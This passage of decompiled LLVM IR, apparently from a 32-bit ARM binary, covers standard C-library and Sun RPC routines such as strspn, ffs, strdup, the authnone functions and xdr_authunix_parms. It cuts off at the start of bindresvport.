  %v1_1a12c = add i32 %v0_1a12c, 1
  store i32 %v1_1a12c, i32* %lr.global-to-local, align 4
  %v0_1a130 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a130, label %.loopexit, label %dec_label_pc_1a134

dec_label_pc_1a134:                               ; preds = %dec_label_pc_1a11c
  %v1_1a134 = add i32 %v0_1a128, 2
  %v2_1a134 = inttoptr i32 %v1_1a134 to i8*
  %v3_1a134 = load i8, i8* %v2_1a134, align 1
  %v4_1a134 = zext i8 %v3_1a134 to i32
  store i32 %v4_1a134, i32* %ip.global-to-local, align 4
  store i32 %v1_1a134, i32* %r3.global-to-local, align 4
  %v2_1a13c = icmp eq i8 %v3_1a134, 0
  store i1 %v2_1a13c, i1* %cpsr_z.global-to-local, align 1
  %v3_1a140 = add i32 %v0_1a12c, 2
  %v4_1a140 = inttoptr i32 %v3_1a140 to i8*
  store i8 %v3_1a134, i8* %v4_1a140, align 1
  %v0_1a144 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a144 = add i32 %v0_1a144, 1
  store i32 %v1_1a144, i32* @r1, align 4
  %v0_1a148 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a148 = add i32 %v0_1a148, 1
  store i32 %v1_1a148, i32* %lr.global-to-local, align 4
  %v0_1a14c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a14c, label %.loopexit, label %dec_label_pc_1a150

dec_label_pc_1a150:                               ; preds = %dec_label_pc_1a134
  %v0_1a150 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a150 = add i32 %v0_1a150, -1
  store i32 %v1_1a150, i32* %r0.global-to-local, align 4
  %v7_1a150 = icmp eq i32 %v0_1a150, 1
  store i1 %v7_1a150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a150, label %dec_label_pc_1a158, label %dec_label_pc_1a0f0

dec_label_pc_1a158:                               ; preds = %dec_label_pc_1a150
  %v0_1a158 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a158 = urem i32 %v0_1a158, 4
  store i32 %v1_1a158, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a178

dec_label_pc_1a160:                               ; preds = %dec_label_pc_1a178
  %v0_1a160 = load i32, i32* @r1, align 4
  %v1_1a160 = inttoptr i32 %v0_1a160 to i8*
  %v2_1a160 = load i8, i8* %v1_1a160, align 1
  %v3_1a160 = zext i8 %v2_1a160 to i32
  store i32 %v3_1a160, i32* %ip.global-to-local, align 4
  %v2_1a164 = icmp eq i8 %v2_1a160, 0
  store i1 %v2_1a164, i1* %cpsr_z.global-to-local, align 1
  %v1_1a168 = add i32 %v1_1a184, -1
  store i32 %v1_1a168, i32* %r2.global-to-local, align 4
  %v3_1a16c = add i32 %v3_1a184, 1
  %v4_1a16c = inttoptr i32 %v3_1a16c to i8*
  store i8 %v2_1a160, i8* %v4_1a16c, align 1
  %v5_1a16c = load i32, i32* %lr.global-to-local, align 4
  %v6_1a16c = add i32 %v5_1a16c, 1
  store i32 %v6_1a16c, i32* %lr.global-to-local, align 4
  %v0_1a170 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a170, label %.loopexit, label %dec_label_pc_1a174

dec_label_pc_1a174:                               ; preds = %dec_label_pc_1a160
  %v0_1a174 = load i32, i32* @r1, align 4
  %v1_1a174 = add i32 %v0_1a174, 1
  store i32 %v1_1a174, i32* @r1, align 4
  %v0_1a178.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a178thread-pre-split

dec_label_pc_1a178thread-pre-split:               ; preds = %dec_label_pc_1a174, %dec_label_pc_1a0e0
  %v2_1a16c6 = phi i32 [ %v6_1a16c, %dec_label_pc_1a174 ], [ %v1_1a0e4, %dec_label_pc_1a0e0 ]
  %v0_1a178.pr = phi i32 [ %v0_1a178.pr.pre, %dec_label_pc_1a174 ], [ %v0_1a0e0, %dec_label_pc_1a0e0 ]
  br label %dec_label_pc_1a178

dec_label_pc_1a178:                               ; preds = %dec_label_pc_1a178thread-pre-split, %dec_label_pc_1a158
  %v3_1a184 = phi i32 [ %v2_1a16c6, %dec_label_pc_1a178thread-pre-split ], [ %v1_1a148, %dec_label_pc_1a158 ]
  %v1_1a184 = phi i32 [ %v0_1a178.pr, %dec_label_pc_1a178thread-pre-split ], [ %v1_1a158, %dec_label_pc_1a158 ]
  %v2_1a178 = icmp eq i32 %v1_1a184, 0
  store i1 %v2_1a178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a178, label %dec_label_pc_1a180, label %dec_label_pc_1a160

dec_label_pc_1a180:                               ; preds = %dec_label_pc_1a178
  %v0_1a180 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a180 = icmp eq i32 %v0_1a180, 0
  store i1 %v2_1a180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a180, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_1a180
  %v4_1a184 = add i32 %v3_1a184, 1
  %v5_1a184 = inttoptr i32 %v4_1a184 to i8*
  store i8 0, i8* %v5_1a184, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1a134, %dec_label_pc_1a11c, %dec_label_pc_1a104, %dec_label_pc_1a0f0, %dec_label_pc_1a160, %dec_label_pc_1a180, %bb
  %v0_1a188 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a188, i32* %r0.global-to-local, align 4
  %v2_1a18c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a18c, i32* @r4, align 4
  ret i32 %v0_1a188

; uselistorder directives
  uselistorder i32 %v1_1a184, { 1, 0 }
  uselistorder i32 %v1_1a158, { 1, 0 }
  uselistorder i32 %v0_1a150, { 1, 0 }
  uselistorder i32 %v1_1a148, { 0, 2, 1 }
  uselistorder i32 %v1_1a144, { 1, 0 }
  uselistorder i32 %v0_1a0e0, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1a0d4, { 1, 0 }
  uselistorder i32 %v0_1a0d4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_1a1c82 = load i32, i32* @r0, align 4
  %v1_1a1c83 = inttoptr i32 %v0_1a1c82 to i8*
  %v2_1a1c84 = load i8, i8* %v1_1a1c83, align 1
  %v2_1a1cc6 = icmp eq i8 %v2_1a1c84, 0
  br i1 %v2_1a1cc6, label %dec_label_pc_1a1d8, label %dec_label_pc_1a1a4.preheader

dec_label_pc_1a19c:                               ; preds = %dec_label_pc_1a1a4
  %v1_1a1ac = add i32 %v0_1a1ac, 1
  %v9_1a19c = icmp eq i8 %v0_1a1b8.in, %v2_1a1a4
  br i1 %v9_1a19c, label %dec_label_pc_1a1b8, label %dec_label_pc_1a1a4

dec_label_pc_1a1a4:                               ; preds = %dec_label_pc_1a1a4.preheader, %dec_label_pc_1a19c
  %v0_1a1ac = phi i32 [ %tmp, %dec_label_pc_1a1a4.preheader ], [ %v1_1a1ac, %dec_label_pc_1a19c ]
  %v1_1a1a4 = inttoptr i32 %v0_1a1ac to i8*
  %v2_1a1a4 = load i8, i8* %v1_1a1a4, align 1
  %v3_1a1a4 = zext i8 %v2_1a1a4 to i32
  store i32 %v3_1a1a4, i32* @ip, align 4
  %v2_1a1a8 = icmp eq i8 %v2_1a1a4, 0
  br i1 %v2_1a1a8, label %dec_label_pc_1a1d8, label %dec_label_pc_1a19c

dec_label_pc_1a1b8:                               ; preds = %dec_label_pc_1a19c
  %v2_1a1b8 = icmp eq i8 %v0_1a1b8.in, 0
  br i1 %v2_1a1b8, label %dec_label_pc_1a1d8, label %dec_label_pc_1a1c0

dec_label_pc_1a1c0:                               ; preds = %dec_label_pc_1a1b8
  %v1_1a1c0 = add i32 %v0_1a1c0, 1
  store i32 %v1_1a1c0, i32* @lr, align 4
  %v1_1a1c4 = add i32 %v0_1a1c4, 1
  %v1_1a1c8 = inttoptr i32 %v1_1a1c4 to i8*
  %v2_1a1c8 = load i8, i8* %v1_1a1c8, align 1
  %v2_1a1cc = icmp eq i8 %v2_1a1c8, 0
  br i1 %v2_1a1cc, label %dec_label_pc_1a1d8, label %dec_label_pc_1a1a4.preheader

dec_label_pc_1a1a4.preheader:                     ; preds = %entry, %dec_label_pc_1a1c0
  %v0_1a1c4 = phi i32 [ %v1_1a1c4, %dec_label_pc_1a1c0 ], [ %v0_1a1c82, %entry ]
  %v0_1a1c0 = phi i32 [ %v1_1a1c0, %dec_label_pc_1a1c0 ], [ 0, %entry ]
  %v0_1a1b8.in = phi i8 [ %v2_1a1c8, %dec_label_pc_1a1c0 ], [ %v2_1a1c84, %entry ]
  br label %dec_label_pc_1a1a4

dec_label_pc_1a1d8:                               ; preds = %dec_label_pc_1a1b8, %dec_label_pc_1a1c0, %dec_label_pc_1a1a4, %entry
  %v0_1a1d8 = phi i32 [ 0, %entry ], [ %v0_1a1c0, %dec_label_pc_1a1a4 ], [ %v1_1a1c0, %dec_label_pc_1a1c0 ], [ %v0_1a1c0, %dec_label_pc_1a1b8 ]
  ret i32 %v0_1a1d8

; uselistorder directives
  uselistorder i8 %v0_1a1b8.in, { 1, 0 }
  uselistorder i8 %v2_1a1a4, { 1, 2, 0 }
  uselistorder i32 %v0_1a1ac, { 1, 0 }
  uselistorder i32* @ip, { 3, 4, 0, 5, 12, 13, 2, 10, 1, 11, 9, 6, 7, 8 }
  uselistorder label %dec_label_pc_1a1d8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a1a4.preheader, { 1, 0 }
}

define i32 @ffs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1a1e4 = urem i32 %arg1, 65536
  %v2_1a1e8 = icmp eq i32 %v3_1a1e4, 0
  br i1 %v2_1a1e8, label %.thread1, label %bb21

.thread1:                                         ; preds = %entry
  %v4_1a1ec = sdiv i32 %arg1, 65536
  br label %bb21

bb21:                                             ; preds = %entry, %.thread1
  %v1_1a200 = phi i32 [ %v4_1a1ec, %.thread1 ], [ %arg1, %entry ]
  %storemerge = phi i32 [ 17, %.thread1 ], [ 1, %entry ]
  %v1_1a1f8 = urem i32 %v1_1a200, 256
  %v2_1a1f8 = icmp eq i32 %v1_1a1f8, 0
  br i1 %v2_1a1f8, label %bb22, label %.thread3

bb22:                                             ; preds = %bb21
  %v2_1a1fc = or i32 %storemerge, 8
  %v4_1a200 = sdiv i32 %v1_1a200, 256
  br label %.thread3

.thread3:                                         ; preds = %bb21, %bb22
  %v1_1a20c = phi i32 [ %storemerge, %bb21 ], [ %v2_1a1fc, %bb22 ]
  %v1_1a210 = phi i32 [ %v1_1a200, %bb21 ], [ %v4_1a200, %bb22 ]
  %v1_1a208 = urem i32 %v1_1a210, 16
  %v2_1a208 = icmp eq i32 %v1_1a208, 0
  br i1 %v2_1a208, label %bb23, label %.thread5

bb23:                                             ; preds = %.thread3
  %v2_1a20c = add nsw i32 %v1_1a20c, 4
  %v4_1a210 = sdiv i32 %v1_1a210, 16
  %v2_1a214 = urem i32 %v2_1a20c, 256
  br label %.thread5

.thread5:                                         ; preds = %.thread3, %bb23
  %v1_1a21c = phi i32 [ %v1_1a20c, %.thread3 ], [ %v2_1a214, %bb23 ]
  %v1_1a220 = phi i32 [ %v1_1a210, %.thread3 ], [ %v4_1a210, %bb23 ]
  %v1_1a218 = urem i32 %v1_1a220, 4
  %v2_1a218 = icmp eq i32 %v1_1a218, 0
  br i1 %v2_1a218, label %bb24, label %.thread7

bb24:                                             ; preds = %.thread5
  %v2_1a21c = add nsw i32 %v1_1a21c, 2
  %v4_1a220 = sdiv i32 %v1_1a220, 4
  %v2_1a224 = urem i32 %v2_1a21c, 256
  br label %.thread7

.thread7:                                         ; preds = %bb24, %.thread5
  %v1_1a23419 = phi i32 [ %v1_1a21c, %.thread5 ], [ %v2_1a224, %bb24 ]
  %v0_1a228.pr = phi i32 [ %v1_1a220, %.thread5 ], [ %v4_1a220, %bb24 ]
  %v2_1a228 = icmp eq i32 %v0_1a228.pr, 0
  br i1 %v2_1a228, label %.thread9, label %bb25

bb25:                                             ; preds = %.thread7
  %v2_1a22c = urem i32 %v0_1a228.pr, 2
  %v2_1a230 = xor i32 %v2_1a22c, 1
  %v3_1a234 = add nsw i32 %v2_1a230, %v1_1a23419
  br label %.thread9

.thread9:                                         ; preds = %.thread7, %bb25
  %v1_1a238 = phi i32 [ 0, %.thread7 ], [ %v3_1a234, %bb25 ]
  ret i32 %v1_1a238

; uselistorder directives
  uselistorder i32 %v1_1a220, { 2, 0, 1 }
  uselistorder i32 %v1_1a210, { 2, 0, 1 }
  uselistorder i32 %v1_1a200, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_1a23c = load i32, i32* @r4, align 4
  store i32 %v3_1a23c, i32* %stack_var_-12, align 4
  %v6_1a23c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_1a244 = call i32 @strlen(i8* %arg1)
  %v1_1a248 = add i32 %v3_1a244, 1
  store i32 %v1_1a248, i32* @r4, align 4
  %v1_1a250 = call i32 @malloc(i32 %v1_1a248)
  store i32 107108, i32* @lr, align 4
  %v1_1a260 = icmp ne i32 %v1_1a250, 0
  call void @__pseudo_cond_branch(i1 %v1_1a260, i32 ptrtoint (i32* @global_var_12600.789 to i32))
  %v2_1a268 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a268, i32* @r4, align 4
  store i32 %v6_1a23c, i32* @r5, align 4
  ret i32 %v1_1a250

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 18, 22, 23, 24, 2, 27, 21, 35, 31, 34, 29, 30, 20, 25, 26, 3, 28, 6, 19, 7, 8, 32, 9, 33, 4, 5, 13, 12, 10, 11, 0, 1, 16, 17, 14, 15 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v1_1a26c = load i32, i32* @r0, align 4
  ret i32 %v1_1a26c
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v1_1a280 = load i32, i32* @r0, align 4
  ret i32 %v1_1a280
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1a28c = call i32 @__rpc_thread_variables()
  store i32 %v0_1a28c, i32* %r0.global-to-local, align 4
  %v1_1a290 = add i32 %v0_1a28c, 152
  %v2_1a290 = inttoptr i32 %v1_1a290 to i32*
  %v3_1a290 = load i32, i32* %v2_1a290, align 4
  %v2_1a294 = icmp eq i32 %v3_1a290, 0
  %v0_1a29c = load i32, i32* @r4, align 4
  store i32 %v0_1a29c, i32* %r0.global-to-local, align 4
  br i1 %v2_1a294, label %dec_label_pc_1a2bc, label %dec_label_pc_1a2a8

dec_label_pc_1a2a8:                               ; preds = %entry
  %v1_1a2ac = add i32 %v0_1a29c, 4
  %v2_1a2ac = inttoptr i32 %v1_1a2ac to i32*
  %v3_1a2ac = load i32, i32* %v2_1a2ac, align 4
  %v1_1a2b4 = add i32 %v3_1a2ac, 12
  %v2_1a2b4 = inttoptr i32 %v1_1a2b4 to i32*
  %v3_1a2b4 = load i32, i32* %v2_1a2b4, align 4
  call void @__pseudo_branch(i32 %v3_1a2b4)
  %v0_1a2b8 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a2bc:                               ; preds = %entry, %dec_label_pc_1a2a8
  %v0_1a2bc = phi i32 [ 0, %entry ], [ %v0_1a2b8, %dec_label_pc_1a2a8 ]
  store i32 %v0_1a2bc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1a2bc

; uselistorder directives
  uselistorder i32 %v0_1a2bc, { 1, 0 }
  uselistorder label %dec_label_pc_1a2bc, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v9_1a2c4 = load i32, i32* @r6, align 4
  %v2_1a2c8 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1a2cc = call i32 @__rpc_thread_variables()
  store i32 %v0_1a2cc, i32* %r0.global-to-local, align 4
  store i32 %v0_1a2cc, i32* @r4, align 4
  %v1_1a2d4 = add i32 %v0_1a2cc, 152
  %v2_1a2d4 = inttoptr i32 %v1_1a2d4 to i32*
  %v3_1a2d4 = load i32, i32* %v2_1a2d4, align 4
  store i32 %v3_1a2d4, i32* @r5, align 4
  %v2_1a2d8 = icmp eq i32 %v3_1a2d4, 0
  store i32 64, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v2_1a2d8, label %dec_label_pc_1a2e8, label %dec_label_pc_1a2fc

dec_label_pc_1a2e8:                               ; preds = %entry
  %v2_1a2e8 = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_1a2e8, i32* @r5, align 4
  %v2_1a2ec = icmp eq i32 %v2_1a2e8, 0
  store i32 %v2_1a2e8, i32* %r0.global-to-local, align 4
  br i1 %v2_1a2ec, label %dec_label_pc_1a380, label %dec_label_pc_1a2f8

dec_label_pc_1a2f8:                               ; preds = %dec_label_pc_1a2e8
  %v1_1a2f8 = load i32, i32* @r4, align 4
  %v2_1a2f8 = add i32 %v1_1a2f8, 152
  %v3_1a2f8 = inttoptr i32 %v2_1a2f8 to i32*
  store i32 %v2_1a2e8, i32* %v3_1a2f8, align 4
  %v0_1a2fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a2fc

dec_label_pc_1a2fc:                               ; preds = %entry, %dec_label_pc_1a2f8
  %v0_1a308 = phi i32 [ %v3_1a2d4, %entry ], [ %v0_1a2fc.pre, %dec_label_pc_1a2f8 ]
  %v1_1a2fc = add i32 %v0_1a308, 60
  %v2_1a2fc = inttoptr i32 %v1_1a2fc to i32*
  %v3_1a2fc = load i32, i32* %v2_1a2fc, align 4
  store i32 %v3_1a2fc, i32* %r2.global-to-local, align 4
  %v2_1a300 = icmp eq i32 %v3_1a2fc, 0
  store i32 ptrtoint (i32* @global_var_2f610.862 to i32), i32* %r0.global-to-local, align 4
  %v1_1a308 = add i32 %v0_1a308, 12
  store i32 %v1_1a308, i32* @r4, align 4
  store i32 %v2_1a2c8, i32* @r6, align 4
  br i1 %v2_1a300, label %dec_label_pc_1a314, label %.thread

dec_label_pc_1a314:                               ; preds = %dec_label_pc_1a2fc
  %v2_1a314 = load i32, i32* @global_var_2f610.862, align 4
  store i32 %v2_1a314, i32* %r0.global-to-local, align 4
  %v5_1a314 = load i32, i32* @global_var_2f614.863, align 4
  store i32 %v5_1a314, i32* %r1.global-to-local, align 4
  %v8_1a314 = load i32, i32* @global_var_2f618.864, align 4
  store i32 %v8_1a314, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ddf8.994 to i32), i32* %ip.global-to-local, align 4
  %v1_1a31c = inttoptr i32 %v1_1a308 to i32*
  store i32 %v2_1a314, i32* %v1_1a31c, align 4
  %v3_1a31c = add i32 %v0_1a308, 16
  %v4_1a31c = inttoptr i32 %v3_1a31c to i32*
  %v5_1a31c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a31c, i32* %v4_1a31c, align 4
  %v6_1a31c = add i32 %v0_1a308, 20
  %v7_1a31c = inttoptr i32 %v6_1a31c to i32*
  %v8_1a31c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1a31c, i32* %v7_1a31c, align 4
  %v0_1a320 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a320 = load i32, i32* @r5, align 4
  %v2_1a320 = add i32 %v1_1a320, 32
  %v3_1a320 = inttoptr i32 %v2_1a320 to i32*
  store i32 %v0_1a320, i32* %v3_1a320, align 4
  %v0_1a324 = load i32, i32* @r5, align 4
  %v1_1a324 = inttoptr i32 %v0_1a324 to i32*
  %v2_1a324 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1a324, i32* %v1_1a324, align 4
  %v3_1a324 = add i32 %v0_1a324, 4
  %v4_1a324 = inttoptr i32 %v3_1a324 to i32*
  %v5_1a324 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a324, i32* %v4_1a324, align 4
  %v6_1a324 = add i32 %v0_1a324, 8
  %v7_1a324 = inttoptr i32 %v6_1a324 to i32*
  %v8_1a324 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1a324, i32* %v7_1a324, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 %v2_1a2c8, i32* %r0.global-to-local, align 4
  %v0_1a330 = load i32, i32* @r5, align 4
  %v1_1a330 = add i32 %v0_1a330, 40
  store i32 %v1_1a330, i32* %r1.global-to-local, align 4
  %v10_1a334 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v1_1a330, i32 20, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_1a338 = load i32, i32* @r5, align 4
  store i32 %v0_1a338, i32* @r1, align 4
  store i32 %v2_1a2c8, i32* @r0, align 4
  %v0_1a340 = call i32 @xdr_opaque_auth()
  %v0_1a344 = load i32, i32* @r4, align 4
  store i32 %v0_1a344, i32* @r1, align 4
  store i32 %v2_1a2c8, i32* @r0, align 4
  %v0_1a34c = call i32 @xdr_opaque_auth()
  store i32 %v2_1a2c8, i32* %r0.global-to-local, align 4
  %v1_1a35c = add i32 %tmp, 16
  %v2_1a35c = inttoptr i32 %v1_1a35c to i32*
  %v3_1a35c = load i32, i32* %v2_1a35c, align 4
  call void @__pseudo_branch(i32 %v3_1a35c)
  %v1_1a360 = load i32, i32* @r5, align 4
  %v2_1a360 = add i32 %v1_1a360, 60
  %v3_1a360 = inttoptr i32 %v2_1a360 to i32*
  store i32 %v2_1a2c8, i32* %v3_1a360, align 4
  %v1_1a368 = add i32 %tmp, 28
  %v2_1a368 = inttoptr i32 %v1_1a368 to i32*
  %v3_1a368 = load i32, i32* %v2_1a368, align 4
  %v2_1a36c = icmp eq i32 %v3_1a368, 0
  store i32 %v2_1a2c8, i32* %r0.global-to-local, align 4
  br i1 %v2_1a36c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1a314
  call void @__pseudo_branch(i32 %v3_1a368)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a314, %dec_label_pc_1a2fc, %bb
  %v0_1a37c = load i32, i32* @r5, align 4
  store i32 %v0_1a37c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a380

dec_label_pc_1a380:                               ; preds = %dec_label_pc_1a2e8, %.thread
  %v14_1a384 = phi i32 [ 0, %dec_label_pc_1a2e8 ], [ %v0_1a37c, %.thread ]
  store i32 %v9_1a2c4, i32* @r6, align 4
  ret i32 %v14_1a384

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32, i32, i32, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32* @global_var_2f610.862, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 152, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_1a380, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a2fc, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_1a390 = load i32, i32* @r4, align 4
  %v6_1a390 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v0_1a3a0 = call i32 @xdr_u_long()
  %v2_1a3a4 = icmp eq i32 %v0_1a3a0, 0
  br i1 %v2_1a3a4, label %dec_label_pc_1a41c, label %dec_label_pc_1a3b8

dec_label_pc_1a3b8:                               ; preds = %entry
  %v0_1a3b0 = load i32, i32* @r5, align 4
  %v0_1a3ac = load i32, i32* @r4, align 4
  %v1_1a3ac = add i32 %v0_1a3ac, 4
  %v3_1a3b8 = inttoptr i32 %v0_1a3b0 to i32*
  %v4_1a3b8 = call i32 @__GI_xdr_string(i32* %v3_1a3b8, i32 %v1_1a3ac, i32 255)
  %v2_1a3bc = icmp eq i32 %v4_1a3b8, 0
  %v0_1a3c0 = load i32, i32* @r4, align 4
  %v1_1a3c0 = add i32 %v0_1a3c0, 8
  store i32 %v1_1a3c0, i32* @r1, align 4
  %v0_1a3c4 = load i32, i32* @r5, align 4
  store i32 %v0_1a3c4, i32* @r0, align 4
  br i1 %v2_1a3bc, label %dec_label_pc_1a41c, label %dec_label_pc_1a3cc

dec_label_pc_1a3cc:                               ; preds = %dec_label_pc_1a3b8
  %v2_1a3cc = inttoptr i32 %v0_1a3c4 to i32*
  %v3_1a3cc = inttoptr i32 %v1_1a3c0 to i32*
  %v4_1a3cc = call i32 @xdr_u_int(i32* %v2_1a3cc, i32* %v3_1a3cc)
  %v2_1a3d0 = icmp eq i32 %v4_1a3cc, 0
  %v0_1a3d4 = load i32, i32* @r4, align 4
  %v1_1a3d4 = add i32 %v0_1a3d4, 12
  store i32 %v1_1a3d4, i32* @r1, align 4
  %v0_1a3d8 = load i32, i32* @r5, align 4
  store i32 %v0_1a3d8, i32* @r0, align 4
  br i1 %v2_1a3d0, label %dec_label_pc_1a41c, label %dec_label_pc_1a3e0

dec_label_pc_1a3e0:                               ; preds = %dec_label_pc_1a3cc
  %v2_1a3e0 = inttoptr i32 %v0_1a3d8 to i32*
  %v3_1a3e0 = inttoptr i32 %v1_1a3d4 to i32*
  %v4_1a3e0 = call i32 @xdr_u_int(i32* %v2_1a3e0, i32* %v3_1a3e0)
  %v2_1a3e4 = icmp eq i32 %v4_1a3e0, 0
  %v0_1a3e8 = load i32, i32* @r4, align 4
  br i1 %v2_1a3e4, label %dec_label_pc_1a41c, label %dec_label_pc_1a3fc

dec_label_pc_1a3fc:                               ; preds = %dec_label_pc_1a3e0
  %v0_1a3f4 = load i32, i32* @r5, align 4
  %v1_1a3ec = add i32 %v0_1a3e8, 20
  %v1_1a3e8 = add i32 %v0_1a3e8, 16
  %v6_1a40c = inttoptr i32 %v0_1a3f4 to i32*
  %v7_1a40c = call i32 @__GI_xdr_array(i32* %v6_1a40c, i32 %v1_1a3ec, i32 %v1_1a3e8, i32 16, i32 4, i32 98844)
  %v2_1a410 = icmp eq i32 %v7_1a40c, 0
  br i1 %v2_1a410, label %dec_label_pc_1a420, label %bb

bb:                                               ; preds = %dec_label_pc_1a3fc
  br label %dec_label_pc_1a420

dec_label_pc_1a41c:                               ; preds = %dec_label_pc_1a3e0, %dec_label_pc_1a3cc, %dec_label_pc_1a3b8, %entry
  br label %dec_label_pc_1a420

dec_label_pc_1a420:                               ; preds = %bb, %dec_label_pc_1a3fc, %dec_label_pc_1a41c
  %v11_1a424 = phi i32 [ 1, %bb ], [ 0, %dec_label_pc_1a3fc ], [ 0, %dec_label_pc_1a41c ]
  store i32 %v3_1a390, i32* @r4, align 4
  store i32 %v6_1a390, i32* @r5, align 4
  ret i32 %v11_1a424

; uselistorder directives
  uselistorder i32 %v0_1a3e8, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 ()* @xdr_u_long, { 9, 11, 14, 8, 7, 13, 6, 10, 2, 1, 0, 12, 5, 4, 3 }
  uselistorder label %dec_label_pc_1a420, { 2, 0, 1 }
}

define i32 @__GI_bindresvport(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1a42c = load i32, i32* @r4, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_1a430 = icmp eq i8* %arg2, null
